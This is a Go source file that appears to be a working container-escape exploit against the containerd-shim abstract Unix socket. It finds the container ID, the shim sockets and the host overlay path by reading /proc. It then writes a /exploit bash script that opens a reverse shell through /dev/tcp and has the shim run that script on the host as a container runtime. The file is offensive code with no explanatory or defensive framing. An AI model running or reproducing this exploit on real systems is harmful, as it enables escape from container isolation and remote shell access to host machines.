package main

import (
	"context"
	"errors"
	"io/ioutil"
	"log"
	"net"
	"regexp"
	"strings"

	types1 "github.com/containerd/containerd/api/types"
	"github.com/containerd/ttrpc"
)

func exp(sock string, containerid string, hostPath string) bool {
	sock = strings.Replace(sock, "@", "", -1)
	conn, err := net.Dial("unix", "\x00"+sock)
	if err != nil {
		log.Println(err)
		return false
	}

	client := ttrpc.NewClient(conn)
	shimClient := NewShimClient(client)
	ctx := context.Background()
	info, err := shimClient.State(ctx, &StateRequest{
		ID: containerid,
	})
	if err != nil {
		log.Println("rpc error:", err)
		return false
	}

	//log.Println("current container info:", info)
	mounts := make([]*types1.Mount, 0)
	mounts = append(mounts, &types1.Mount{
		Type:   "bind",
		Source: "/mnt",
	})
	log.Println("exploit path on host:", hostPath+"/exploit")
	newTask, err := shimClient.Create(ctx, &CreateTaskRequest{
		ID:       "hdsfjashdfjhaskjdfhkj",
		Bundle:   info.Bundle,
		Runtime:  hostPath + "/exploit",
		Terminal: false,
	})

	if err != nil {
		log.Println("rpc error:", err)
		return false
	}

	log.Println("new task info:", newTask)
	return true
}

func getContainerID() (string, error) {
	data, err := ioutil.ReadFile("/proc/self/cgroup")
	if err != nil {
		return "", err
	}
	cgroupData := string(data)
	lines := strings.Split(cgroupData, "\n")
	cgmatch, err := regexp.Compile(".*:pids:/docker/(.*)")
	containerid := ""
	for _, l := range lines {
		match := cgmatch.FindStringSubmatch(l)
		if len(match) == 0 {
			continue
		}
		containerid = match[1]
	}

	if containerid == "" {
		return "", errors.New("Container id not found")
	}

	return containerid, nil
}

func getShimSockets() ([][]byte, error) {
	re, err := regexp.Compile("@/containerd-shim/.*\\.sock")
	if err != nil {
		return nil, err
	}
	data, err := ioutil.ReadFile("/proc/net/unix")
	matches := re.FindAll(data, -1)
	if matches == nil {
		return nil, errors.New("cannot find vulnerable socket")
	}
	return matches, nil
}

func getHostPath() (string, error) {
	re, err := regexp.Compile("overlay.*,workdir=(.*/)work")
	if err != nil {
		return "", err
	}
	data, err := ioutil.ReadFile("/proc/mounts")
	matches := re.FindSubmatch(data)
	if matches == nil {
		return "", errors.New("cannot find Host Path")
	}
	return string(matches[1]) + "merged", nil
}

func main() {

	err := ioutil.WriteFile("/exploit", []byte("#!/bin/bash\nsetsid bash -c 'sh >& /dev/tcp/127.0.0.1/8080 0>&1' &\n"), 0777)
	if err != nil {
		log.Fatalln(err)
	}
	containerid, err := getContainerID()
	if err != nil {
		log.Fatalln(err)
	}
	log.Println("Current container id:", containerid)

	matchset := make(map[string]bool)
	socks, err := getShimSockets()
	if err != nil {
		log.Fatalln(err)
	}
	hostPath, err := getHostPath()
	if err != nil {
		log.Fatalln(err)
	}
	log.Println("Host path:", hostPath)
	for _, b := range socks {
		sockname := string(b)
		if _, ok := matchset[sockname]; ok {
			continue
		}
		log.Println("try socket:", sockname)
		matchset[sockname] = true
		if exp(sockname, containerid, hostPath) {
			break
		}
	}

	return
}
